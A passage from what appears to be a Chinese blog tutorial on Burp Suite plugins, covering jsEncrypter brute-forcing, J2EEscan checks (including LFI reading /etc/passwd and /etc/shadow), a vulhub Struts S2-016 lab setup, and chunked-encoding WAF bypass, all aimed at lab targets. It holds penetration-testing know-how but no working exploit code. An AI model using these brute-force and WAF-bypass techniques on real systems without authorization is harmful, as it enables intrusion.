title="3.4 jsEncrypter插件使用"></a>3.4 jsEncrypter插件使用</h2><h3 id="3-4-1-运行靶机"><a href="#3-4-1-运行靶机" class="headerlink" title="3.4.1 运行靶机"></a>3.4.1 运行靶机</h3><p>项目提供了一个用php编写的靶机（jsEncrypter/server）,靶机提供了7个算法对密码进行加密后传输，后台解密，最后进行密码匹配。</p><ul><li>base64</li><li>md5</li><li>sha1</li><li>sha254</li><li>sha384</li><li>sha512</li><li>RSA</li></ul><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009175724.png" class="lozad"></p><h3 id="3-4-2-编写phantomJS运行脚本"><a href="#3-4-2-编写phantomJS运行脚本" class="headerlink" title="3.4.2 编写phantomJS运行脚本"></a>3.4.2 编写phantomJS运行脚本</h3><p><code>jsEncrypter/js/jsEncrypter_base.js</code>为插件phantomJS脚本模板。我们只需要将实现加密算法的js文件引入模板脚本，并在模板脚本的js_encrypt函数体中完成对加密函数的调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">// 加载实现加密算法的js脚本</span><br><span class="line">var wasSuccessful = phantom.injectJs(&apos;xxx.js&apos;);/*引入实现加密的js文件*/</span><br><span class="line"> </span><br><span class="line">// 处理函数</span><br><span class="line">function js_encrypt(payload)&#123;</span><br><span class="line"> var newpayload;</span><br><span class="line"> /**********在这里编写调用加密函数进行加密的代码************/</span><br><span class="line">  /**********************************************************/</span><br><span class="line"> return newpayload;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>项目jsEncrypter/server/TestScript目录下是编写好的对应靶机各个加密算法的phantomJS脚本，可以参考！</p><h3 id="3-4-3-运行phantomJS并测试"><a href="#3-4-3-运行phantomJS并测试" class="headerlink" title="3.4.3 运行phantomJS并测试"></a>3.4.3 运行phantomJS并测试</h3><p>运行phantomJS</p><p>测试的目的是为了确保我们编写的phantomJS脚本能够正常加密payload。</p><p><img alt data-src="https://github.com/c0ny1/jsEncrypter/raw/master/doc/test.gif" class="lozad"></p><h3 id="抓包暴力破解"><a href="#抓包暴力破解" class="headerlink" title="抓包暴力破解"></a>抓包暴力破解</h3><p><img alt="img" data-src="https://github.com/c0ny1/jsEncrypter/raw/master/doc/crack.gif" class="lozad"></p><h1 id="0x04-BurpBounty"><a href="#0x04-BurpBounty" class="headerlink" title="0x04 BurpBounty"></a>0x04 BurpBounty</h1><h2 id="4-1-介绍"><a href="#4-1-介绍" class="headerlink" title="4.1 介绍"></a>4.1 介绍</h2><p>Burp Bounty（BApp商店中的扫描检查生成器）是Burp Suite的扩展，它允许您以快速简单的方式通过非常直观的图形界面通过个性化规则改进主动和被动扫描仪。</p><h2 id="4-2-下载"><a href="#4-2-下载" class="headerlink" title="4.2 下载"></a>4.2 下载</h2><blockquote><p><a href="https://github.com/wagiro/BurpBounty/releases" target="_blank" rel="noopener">https://github.com/wagiro/BurpBounty/releases</a></p></blockquote><h2 id="4-3-安装"><a href="#4-3-安装" class="headerlink" title="4.3 安装"></a>4.3 安装</h2><p>1.在burp extender模块加载插件 </p><p><img alt data-src="https://s2.ax1x.com/2019/05/14/EoB6TH.png" class="lozad"></p><p>2.显示界面</p><p><img alt data-src="https://s2.ax1x.com/2019/05/14/EoDr3q.png" class="lozad"></p><h2 id="4-4-使用"><a href="#4-4-使用" class="headerlink" title="4.4 使用"></a>4.4 使用</h2><h3 id="4-4-1-基本使用"><a href="#4-4-1-基本使用" class="headerlink" title="4.4.1 基本使用"></a>4.4.1 基本使用</h3><p>1.选择 Profiles Directory</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015103956.png" class="lozad"></p><p>2.加载字典</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015102438.png" class="lozad"></p><p>3.过滤设置为all,扫描的时候启动全部项目</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015103922.png" class="lozad"></p><p>4.实验环境-DVWA</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015104026.png" class="lozad"></p><p>5.抓包拦截-执行主动扫描</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015103716.png" class="lozad"></p><p>6.扫描结果</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015104100.png" class="lozad"></p><h3 id="4-4-2-高级使用"><a href="#4-4-2-高级使用" class="headerlink" title="4.4.2 高级使用"></a>4.4.2 高级使用</h3><p>【添加扫描项目】</p><ol><li>命名</li><li>作者</li><li>选择扫描方式：主动扫描</li><li>选择request方式加载payload</li><li>选择payload设置：替换、添加</li><li>当然也可以选择payload编码方式</li></ol><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015104353.png" class="lozad"></p><ol start="7"><li>选择response方式,设置payload返回包匹配规则</li></ol><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015104430.png" class="lozad"></p><ol start="8"><li>选择issue,设置漏洞等级，细节描述等</li></ol><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015104455.png" class="lozad"></p><h1 id="0x05-JSBeautiful"><a href="#0x05-JSBeautiful" class="headerlink" title="0x05 JSBeautiful"></a>0x05 JSBeautiful</h1><h2 id="5-1-介绍"><a href="#5-1-介绍" class="headerlink" title="5.1 介绍"></a>5.1 介绍</h2><p>简单说一下就是美化网页资源JS CSS HTML XML的</p><h2 id="5-2-下载"><a href="#5-2-下载" class="headerlink" title="5.2 下载"></a>5.2 下载</h2><p><a href="https://github.com/irsdl/BurpSuiteJSBeautifier" target="_blank" rel="noopener">https://github.com/irsdl/BurpSuiteJSBeautifier</a></p><h2 id="5-3-安装"><a href="#5-3-安装" class="headerlink" title="5.3 安装"></a>5.3 安装</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015105516.png" class="lozad"></p><p>导入后会出错，原因是还没有导入lib包，接着导入lib包即可。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015110125.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015110330.png" class="lozad"></p><p>成功导入lib包后，再次到extensions模块下开启插件</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015110410.png" class="lozad"></p><p>然后会多出来一个标签栏</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015110534.png" class="lozad"></p><h2 id="5-4-使用"><a href="#5-4-使用" class="headerlink" title="5.4 使用"></a>5.4 使用</h2><p>随便访问GitHub网站，然后在拦截的数据包的返回包中右击，点击</p><p>beautify this。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015111316.png" class="lozad"></p><p>点击以后会弹出一个小窗口，点击确定就可以了。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015111755.png" class="lozad"></p><h1 id="0x06-Hackvertor"><a href="#0x06-Hackvertor" class="headerlink" title="0x06 Hackvertor"></a>0x06 Hackvertor</h1><h2 id="6-1-介绍"><a href="#6-1-介绍" class="headerlink" title="6.1 介绍"></a>6.1 介绍</h2><p>Hackvertor是一个基于标签的转换工具，支持各种转义和编码，包括HTML5实体，十六进制，八进制，unicode，url编码等。</p><ul><li>它使用类似XML的标记来指定使用的编码/转换类型。</li><li>您可以使用多个嵌套标记来执行转换。</li><li>标签也可以有参数，允许它们像函数一样运行。</li><li>它具有自动解码功能，可以猜测所需的转换类型并自动解码多次。</li><li>多个标签</li><li>字符集转换</li></ul><h2 id="6-2-下载"><a href="#6-2-下载" class="headerlink" title="6.2 下载"></a>6.2 下载</h2><p><a href="https://github.com/hackvertor/hackvertor" target="_blank" rel="noopener">https://github.com/hackvertor/hackvertor</a></p><h2 id="6-3-安装"><a href="#6-3-安装" class="headerlink" title="6.3 安装"></a>6.3 安装</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015113437.png" class="lozad"></p><h2 id="6-4-使用"><a href="#6-4-使用" class="headerlink" title="6.4 使用"></a>6.4 使用</h2><h3 id="1-简单base64加密"><a href="#1-简单base64加密" class="headerlink" title="1.简单base64加密"></a>1.简单base64加密</h3><p>首先输入一个1</p><p><img alt="nEON7V.png" data-src="https://s2.ax1x.com/2019/09/04/nEON7V.png" class="lozad"></p><p>选中1，选择base64加密</p><p><img alt="nEOrc9.png" data-src="https://s2.ax1x.com/2019/09/04/nEOrc9.png" class="lozad"></p><h3 id="2-多层加密base64-md5"><a href="#2-多层加密base64-md5" class="headerlink" title="2.多层加密base64+md5"></a>2.多层加密base64+md5</h3><p><img alt="nEzuRO.png" data-src="https://s2.ax1x.com/2019/09/04/nEzuRO.png" class="lozad"></p><h3 id><a href="#" class="headerlink" title=" "></a> </h3><p><img alt="nEz8eA.png" data-src="https://s2.ax1x.com/2019/09/04/nEz8eA.png" class="lozad"></p><h3 id="3-大致布局"><a href="#3-大致布局" class="headerlink" title="3.大致布局"></a>3.大致布局</h3><p><img alt="nVSIgS.png" data-src="https://s2.ax1x.com/2019/09/04/nVSIgS.png" class="lozad"></p><p>charset               字符集</p><p>compression     压缩 </p><p>encrypt               加密</p><p>HMACMD5         计算基于哈希值的消息验证代码</p><h2 id="6-5-参考"><a href="#6-5-参考" class="headerlink" title="6.5 参考"></a>6.5 参考</h2><ol><li><a href="https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100" target="_blank" rel="noopener">https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100</a></li><li><a href="https://portswigger.net/blog/bypassing-wafs-and-cracking-xor-with-hackvertor" target="_blank" rel="noopener">https://portswigger.net/blog/bypassing-wafs-and-cracking-xor-with-hackvertor</a></li></ol><h1 id="0x07-jsonBeautiful"><a href="#0x07-jsonBeautiful" class="headerlink" title="0x07 jsonBeautiful"></a>0x07 jsonBeautiful</h1><h2 id="7-1-介绍"><a href="#7-1-介绍" class="headerlink" title="7.1 介绍"></a>7.1 介绍</h2><p>简单来说就是美化json的，让json数据看起来更加美观 </p><h2 id="7-2-下载"><a href="#7-2-下载" class="headerlink" title="7.2 下载"></a>7.2 下载</h2><h2 id="7-3-安装"><a href="#7-3-安装" class="headerlink" title="7.3 安装"></a>7.3 安装</h2><p>在BApp Store中下载</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015114642.png" class="lozad"></p><h2 id="7-4-使用"><a href="#7-4-使用" class="headerlink" title="7.4 使用"></a>7.4 使用</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015140742.png" class="lozad"></p><h1 id="0x08-J2EEscan"><a href="#0x08-J2EEscan" class="headerlink" title="0x08 J2EEscan"></a>0x08 J2EEscan</h1><h2 id="8-1-介绍"><a href="#8-1-介绍" class="headerlink" title="8.1 介绍"></a>8.1 介绍</h2><p>J2EEScan是Burp Suite的插件。此插件的目标是在J2EE应用程序的Web应用程序渗透测试期间改进测试覆盖率。【官方】</p><p>J2EEScan能测漏洞，比如<span style="color: rgb(68, 68, 68);">Apache Struts</span>、<span style="color: rgb(68, 68, 68);">JBoss</span>、<span style="color: rgb(68, 68, 68);"><span style="color: rgb(68, 68, 68);">Java Server</span>、<span style="color: rgb(68, 68, 68);">Tom猫、等东东的漏洞。【非高大尚解释】</span></span></p><h3 id="测试用例："><a href="#测试用例：" class="headerlink" title="测试用例："></a>测试用例：</h3><p><strong>杂项</strong></p><ul><li>表达语言注入（CVE-2011-2730）</li><li>Apache Roller OGNL注射液（CVE-2013-4212）</li><li>本地文件包括 - /WEB-INF/web.xml已检索</li><li>本地文件包含 - 检索Spring应用程序上下文</li><li>本地文件包含 - 检索到struts.xml</li><li>本地文件包含 - 检索到weblogic.xml</li><li>本地文件包含 - 检索到的ibm-ws-bnd.xml</li><li>本地文件包含 - ibm-web-ext.xmi检索</li><li>本地文件包含 - 检索到的ibm-web-ext.xml</li><li>本地文件包含 - / etc / shadow已检索</li><li>本地文件包含 - / etc / passwd已检索</li><li>HTTP Auth弱密码</li><li>检索到WEB-INF应用程序配置文件</li><li>状态Servlet（CVE-2008-3273）</li><li>Snoop Servlet（CVE-2012-2170）</li><li>扩展路径遍历扫描</li><li>AJP服务检测 - 感谢<a href="https://twitter.com/_ikki" target="_blank" rel="noopener">@ikki</a></li><li>弹簧启动执行器控制台</li><li>UTF8响应拆分</li><li>JK管理端点</li><li>Pivotal Spring Traversal（CVE-2014-3625）</li></ul><p><strong>Apache Struts</strong></p><ul><li>Apache Struts 2 S2-023 - 感谢<a href="https://twitter.com/h3xstream" target="_blank" rel="noopener">@ h3xstream</a></li><li>Apache Struts 2 S2-016</li><li>Apache Struts 2 S2-017</li><li>Apache Struts 2 S2-020</li><li>Apache Struts 2 S2-021</li><li>Apache Struts 2 S2-032</li><li>Apache Struts DevMode已启用</li><li>Apache Struts OGNL控制台</li></ul><p><strong>Grails的</strong></p><ul><li>Grails Path Traversal（CVE-2014-0053）</li></ul><p><strong>Apache Wicket</strong></p><ul><li>Apache Wicket任意资源访问（CVE-2015-2080）</li></ul><p><strong>Java Server Faces</strong></p><ul><li>Java Server Faces本地文件包含（CVE-2013-3827 CVE-2011-4367）</li></ul><p><strong>JBoss SEAM</strong></p><ul><li>JBoss SEAM远程命令执行（CVE-2010-1871）</li></ul><p><strong>错误处理不正确</strong></p><ul><li>JSF</li><li>Apache Struts</li><li>Apache Tapestry</li><li>Grails的</li><li>GWT</li><li>Java的</li></ul><p><strong>XML安全性</strong></p><ul><li>X包括支持</li><li>XML外部实体</li></ul><p><strong>信息披露问题</strong></p><ul><li>远程JVM版本</li><li>Apache Tomcat版本</li><li>码头版</li><li>Oracle Application Server版本</li><li>Oracle Glassfish版本</li><li>Oracle Weblogic版本</li></ul><p><strong>合规性检查</strong></p><ul><li>web.xml - HTTP动词篡改</li><li>web.xml - 会话跟踪的URL参数</li><li>web.xml - 不完整的错误处理</li><li>web.xml - Invoker Servlet</li></ul><p><strong>JBoss</strong></p><ul><li>JBoss Web服务枚举</li><li>JBoss管理员控制台弱密码</li><li>JBoss JMX / Web控制台不受密码保护</li><li>JBoss JMX Invoker远程命令执行</li><li>JBoss Undertow目录遍历（CVE-2014-7816）</li><li>JBoss jBPM管理控制台</li></ul><p><strong>Tomcat</strong></p><ul><li>Tomcat Manager控制台弱密码</li><li>Tomcat Host Manager控制台弱密码</li><li>生命终结软件 - Tomcat</li></ul><p><strong>Weblogic</strong></p><ul><li>Weblogic UDDI Explorer Detection</li><li>Weblogic UDDI Explorer SSRF漏洞（CVE-2014-4210）</li><li>Weblogic管理控制台弱密码</li></ul><p><strong>Oracle应用服务器</strong></p><ul><li>添加了对Oracle Log Database Accessible的检查</li><li>添加了对多个Oracle应用服务器默认资源的检查（CVE-2002-0565，CVE-2002-0568，CVE-2002-0569）</li><li>生命周期结束软件 - Oracle应用服务器</li></ul><p><strong>码头</strong></p><ul><li>由<a href="https://twitter.com/gdssecurity/" target="_blank" rel="noopener">@gdssecurity</a>发现的Jetty Remote Leak Shared Buffers（CVE-2015-2080）</li><li>生命终结软件 - 码头</li></ul><p><strong>Apache Axis</strong></p><ul><li>Apache Axis2 - Web服务枚举</li><li>Apache Axis2 - 管理控制台弱密码</li><li>Apache Axis2 - 本地文件包含漏洞（OSVDB 59001）</li><li>Apache Axis2 - Happy Axis</li></ul><p><strong>NodeJS</strong></p><ul><li>NodeJS HTTP重定向（CVE-2015-1164）</li><li>NodeJS HTTP响应拆分（CVE-2016-2216）</li></ul><h2 id="8-2-下载"><a href="#8-2-下载" class="headerlink" title="8.2 下载"></a>8.2 下载</h2><h2 id="8-3-安装"><a href="#8-3-安装" class="headerlink" title="8.3 安装"></a>8.3 安装</h2><ul><li>从“选项” - &gt;“会话”中的“Cookie jar”部分启用扫描程序字段</li><li>在Burp Extender选项卡中加载J2EEscan jar</li><li>该插件至少需要Java 1.7</li></ul><p><strong>1) Cookie Jar启动扫描程序</strong></p><p>Burp通过维护Cookie jar来维护你访问过得所有web站点的cookie信息，Cookie jar的信息在Burp的所有工具组件之间是数据共享的。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015141813.png" class="lozad"></p><p>我们可以通过上图中的勾选项配置，来指定Cookie jar在哪些工具组件之间生效。</p><p><strong>2) 下载安装J2EEScan</strong></p><p>在Burp Extender选项卡中，找到J2EEscan jar<strong>，</strong>点击<strong>install</strong>进行安装</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015141858.png" class="lozad"></p><p><strong>3）java版本至少为1.7</strong></p><p>运行Java -version 检测</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015141928.png" class="lozad"></p><h2 id="8-4-使用"><a href="#8-4-使用" class="headerlink" title="8.4 使用"></a>8.4 使用</h2><h3 id="8-4-1-搭建测试环境【S2-016"><a href="#8-4-1-搭建测试环境【S2-016" class="headerlink" title="8.4.1 搭建测试环境【S2-016]"></a>8.4.1 搭建测试环境【S2-016]</h3><p><em>找了好多集成测试平台，都不合适，只能用vulhub自己搭建一个了。</em></p><p>_关于具体搭建方法可以参考<a href="https://vulhub.org/" target="_blank" rel="noopener">vulhub官网</a>，有视频有文档。<br>_</p><p><strong>kali 下搭建 ：<br>第一步：执行命令 sudo apt  install docker.io</strong></p><p><img alt="2019-04-01_211301.png" data-src="https://image.3001.net/images/20190401/1554124646_5ca20f66975d5.png!small" class="lozad">*<em>碰到y/n  或者 yes / not   一律yes *</em></p><p><img alt="2019-04-01_211340.png" data-src="https://image.3001.net/images/20190401/1554124659_5ca20f7339b86.png!small" class="lozad"><strong>第二步：检测docker是否安装成功，命令行执行：docker -v<br><img alt="2019-04-01_212527.png" data-src="https://image.3001.net/images/20190401/1554125206_5ca21196624a8.png!small" class="lozad">**</strong>第三步：启动docker,命令行执行：sudo service  docker  start<br>              查看是否启动成功执行：sudo service docker status,running代表启动成功**</p><p><img alt="2019-04-01_212431.png" data-src="https://image.3001.net/images/20190401/1554125354_5ca2122a9e100.png!small" class="lozad">**第四步：安装docker-compose ,执行命令：pip install docker-compose<br> 我这之前装过already</p><p>**</p><p><strong><img alt="2019-04-01_213238.png" data-src="https://image.3001.net/images/20190401/1554125577_5ca21309c93ee.png!small" class="lozad"><br><span></span></strong></p><p><strong>第五步：安装下载vulhub,执行命令： git clone <a href="https://github.com/vulhub/vulhub.git" target="_blank" rel="noopener">https://github.com/vulhub/vulhub.git</a><img alt="2019-04-01_213552.png" data-src="https://image.3001.net/images/20190401/1554125775_5ca213cfc734b.png!small" class="lozad">**</strong>_我这个随便搞得，建议git clone 的时候，在/tmp目录下执行【安装过程慢得很啊】<br>_<br>第六步：安装好后进入到vulhub,目录，选择一个你想创建使用的漏洞执行：docker-compose up -d 即可<br><img alt="2019-04-01_214211.png" data-src="https://image.3001.net/images/20190401/1554126257_5ca215b1c614b.png!small" class="lozad"><strong>**执行完就等着吧，，，慢的很</strong><br><img alt="2019-04-01_214608.png" data-src="https://image.3001.net/images/20190401/1554126386_5ca21632c0dc6.png!small" class="lozad"></p><h3 id="8-4-2-使用演示"><a href="#8-4-2-使用演示" class="headerlink" title="8.4.2 使用演示"></a>8.4.2 使用演示</h3><p><strong>1) 访问漏洞地址：<a href="http://192.168.6.145:8080/index.action?" target="_blank" rel="noopener">http://192.168.6.145:8080/index.action?</a></strong></p><p><img alt="2019-04-01_220425.png" data-src="https://image.3001.net/images/20190401/1554127574_5ca21ad68acdc.png!small" class="lozad"><strong>2) 为确定是否成功搭建环境，我们事先用工具验证一下是否存在s2-016</strong></p><p><img alt="2019-04-01_220715.png" data-src="https://image.3001.net/images/20190401/1554127663_5ca21b2fca097.png!small" class="lozad"><strong>3) 打开burp suite,进行抓包，并扫描网站</strong></p><p><img alt="2019-04-01_220252.png" data-src="https://image.3001.net/images/20190401/1554127751_5ca21b87220ee.png!small" class="lozad"><strong>4)切换到scanner 里面观察，等待</strong></p><p><img alt="2019-04-01_221847.png" data-src="https://image.3001.net/images/20190401/1554128394_5ca21e0aeddf6.png!small" class="lozad"><strong>这里面扫出来的是S2-017,其实是没扫完，在Scan queue队列可以看到只扫了33%</strong></p><h3 id="-1"><a href="#-1" class="headerlink" title></a><img alt="2019-04-01_222037.png" data-src="https://image.3001.net/images/20190401/1554128497_5ca21e71eb209.png!small" class="lozad"></h3><h3 id="8-4-3-注意事项"><a href="#8-4-3-注意事项" class="headerlink" title="8.4.3 注意事项"></a>8.4.3 注意事项</h3><p>1）使用前，请确保cookier jar里面选择scanner</p><p>2) J2EEScan,并不像其他 插件一样有单独的菜单</p><h3 id="-2"><a href="#-2" class="headerlink" title></a><img alt="2019-04-02_094025.png" data-src="https://image.3001.net/images/20190402/1554169351_5ca2be0755580.png!small" class="lozad"></h3><h2 id="8-5-参考"><a href="#8-5-参考" class="headerlink" title="8.5 参考"></a>8.5 参考</h2><p>Burpsuite插件之J2EEScan使用方法</p><p><a href="https://www.uedbox.com/post/59166/" target="_blank" rel="noopener">https://www.uedbox.com/post/59166/</a></p><p><a href="https://github.com/lilifengcode/Burpsuite-Plugins-Usage" target="_blank" rel="noopener">https://github.com/lilifengcode/Burpsuite-Plugins-Usage</a></p><h1 id="0x09-chunked-coding-converter"><a href="#0x09-chunked-coding-converter" class="headerlink" title="0x09 chunked-coding-converter"></a>0x09 chunked-coding-converter</h1><h2 id="9-1-介绍"><a href="#9-1-介绍" class="headerlink" title="9.1 介绍"></a>9.1 介绍</h2><p>chunked 是 http 协议里面的分块传输，简单说就是一个数据传输方式，之后将数据一段一段传过去，waf 无法检测到，就是绕过了，可以结合 sqlmap 来玩.</p><h2 id="9-2-下载"><a href="#9-2-下载" class="headerlink" title="9.2 下载"></a>9.2 下载</h2><blockquote><p><a href="https://github.com/c0ny1/chunked-coding-converter" target="_blank" rel="noopener">https://github.com/c0ny1/chunked-coding-converter</a></p><p>下载地址：<a href="http://pan.ximcx.cn/show/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/BurpSuite%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6/chunked-coding-converter.0.2.1.jar" target="_blank" rel="noopener">传送门</a></p></blockquote><h2 id="9-3-安装"><a href="#9-3-安装" class="headerlink" title="9.3 安装"></a>9.3 安装</h2><p>在burp extender模块加载插件 ，与之前的插件安装类似，将下载来下的插件jar包复制到burpsuite的插件文件夹中，然后再burp suite的extender模块去导入jar包即可。</p><h2 id="9-4-使用"><a href="#9-4-使用" class="headerlink" title="9.4 使用"></a>9.4 使用</h2><p><a href="https://github.com/c0ny1/chunked-coding-converter/blob/master/doc/menu.png" target="_blank" rel="noopener"><img alt="菜单" data-src="https://github.com/c0ny1/chunked-coding-converter/raw/master/doc/menu.png" class="lozad"></a></p><p><a href="https://github.com/c0ny1/chunked-coding-converter/blob/master/doc/config.png" target="_blank" rel="noopener"><img alt="配置" data-src="https://github.com/c0ny1/chunked-coding-converter/raw/master/doc/config.png" class="lozad"></a></p><blockquote><p>分块传输相关文章：</p><ul><li><a href="https://www.anquanke.com/post/id/169738" target="_blank" rel="noopener">利用分块传输吊打所有WAF</a></li><li><a href="https://www.freebuf.com/news/193659.html" target="_blank" rel="noopener">在HTTP协议宪法绕过WAF</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==&mid=2247483787&idx=1&sn=54c33727696f8ee6d67f997acc11ab89&chksm=cf36f9cbf84170dd7da9b48b3365fb05d7ccec6bdeff480d0c38962f712e400a40b2b38dc467&token=360242838&lang=zh_CN#rd" target="_blank" rel="noopener">编写Burp分块传输插件绕WAF</a></li></ul></blockquote><h2 id="9-5-参考"><a href="#9-5-参考" class="headerlink" title="9.5 参考"></a>9.5 参考</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==&mid=2247483787&idx=1&sn=54c33727696f8ee6d67f997acc11ab89&chksm=cf36f9cbf84170dd7da9b48b3365fb05d7ccec6bdeff480d0c38962f712e400a40b2b38dc467&token=360242838&lang=zh_CN#rd" target="_blank" rel="noopener">编写Burp分块传输插件绕WAF</a></p><h1 id="0x10-domain-hunter"><a href="#0x10-domain-hunter" class="headerlink" title="0x10 domain_hunter"></a>0x10 domain_hunter</h1><h2 id="10-1-介绍"><a href="#10-1-介绍" class="headerlink" title="10.1 介绍"></a>10.1 介绍</h2><p>扫描子域名的一个插件</p><h2 id="10-2-下载"><a href="#10-2-下载" class="headerlink" title="10.2 下载"></a>10.2 下载</h2><blockquote><p>github地址：<a href="https://github.com/bit4woo/domain_hunter" target="_blank" rel="noopener">https://github.com/bit4woo/domain_hunter</a></p><p>下载地址：<a href="https://github.com/bit4woo/domain_hunter/releases" target="_blank" rel="noopener">https://github.com/bit4woo/domain_hunter/releases</a></p></blockquote><h2 id="10-3-安装"><a href="#10-3-安装" class="headerlink" title="10.3 安装"></a>10.3 安装</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015153833.png" class="lozad"></p><p>安装完成后，会多一个选项卡</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015153852.png" class="lozad"></p><h2 id="10-4-使用"><a href="#10-4-使用" class="headerlink" title="10.4 使用"></a>10.4 使用</h2><p>第一步：点击 add,添加关键字<br>第二步：访问网站，要有流量才能分析<br>第三步：点击 search</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015153918.png" class="lozad"></p><h1 id="0x11-HackBar"><a href="#0x11-HackBar" class="headerlink" title="0x11  HackBar"></a>0x11  HackBar</h1><h2 id="11-1-介绍"><a href="#11-1-介绍" class="headerlink" title="11.1 介绍"></a>11.1 介绍</h2><p>功能和火狐上的插件hackbar差不多，但是相对有些区别，好用还是挺好用的。</p><h2 id="11-2-下载"><a href="#11-2-下载" class="headerlink" title="11.2 下载"></a>11.2 下载</h2><blockquote><p><a href="https://github.com/d3vilbug/HackBar/releases/tag/1.0" target="_blank" rel="noopener">https://github.com/d3vilbug/HackBar/releases/tag/1.0</a></p></blockquote><h2 id="11-3-安装"><a href="#11-3-安装" class="headerlink" title="11.3 安装"></a>11.3 安装</h2><p>下载插件，点击 burpsuite 的 extender 模块添加就行</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015154402.png" class="lozad"></p><p>安装完，鼠标右键会发现“HACK Bar”</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015154438.png" class="lozad"></p><h2 id="11-4-使用"><a href="#11-4-使用" class="headerlink" title="11.4 使用"></a>11.4 使用</h2><p>在你拦截的数据包，选中要替换的数据，选择 hack bar 的相应功能即可，有 sql 注入，xxe,xss,一些常见的 webshell 等；下面用 LFI 举例</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015154533.png" class="lozad"></p><p>点完，就替换成功了</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015154549.png" class="lozad"></p><h1 id="0x12-json-web-tokens"><a href="#0x12-json-web-tokens" class="headerlink" title="0x12 json-web-tokens"></a>0x12 <strong>json-web-tokens</strong></h1><h2 id="12-1-介绍"><a href="#12-1-介绍" class="headerlink" title="12.1 介绍"></a>12.1 介绍</h2><p>json-web-tokens,简称JWT ，快速入门：<a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" target="_blank" rel="noopener">传送门</a></p><h2 id="12-2-下载"><a href="#12-2-下载" class="headerlink" title="12.2 下载"></a>12.2 下载</h2><blockquote><p><a href="https://github.com/PortSwigger/json-web-tokens" target="_blank" rel="noopener">https://github.com/PortSwigger/json-web-tokens</a></p></blockquote><h2 id="12-3-安装"><a href="#12-3-安装" class="headerlink" title="12.3 安装"></a>12.3 安装</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015155642.png" class="lozad"></p><h2 id="12-4-使用"><a href="#12-4-使用" class="headerlink" title="12.4 使用"></a>12.4 使用</h2><p>访问项目主页的演示环境 <a href="https://oz-web.com/jwt/，之后访问页面，burp" target="_blank" rel="noopener">https://oz-web.com/jwt/，之后访问页面，burp</a> 抓包</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015155835.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015155903.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015155940.png" class="lozad"></p><p>工具会自动帮我们解出来，你也可以复制 JWT 到里面工具窗口下解密</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015160140.png" class="lozad"></p><h1 id="0x13-LFI-scanner-checks"><a href="#0x13-LFI-scanner-checks" class="headerlink" title="0x13 LFI scanner checks"></a>0x13 LFI scanner checks</h1><h2 id="13-1-介绍"><a href="#13-1-介绍" class="headerlink" title="13.1 介绍"></a>13.1 介绍</h2><p>这个工具是 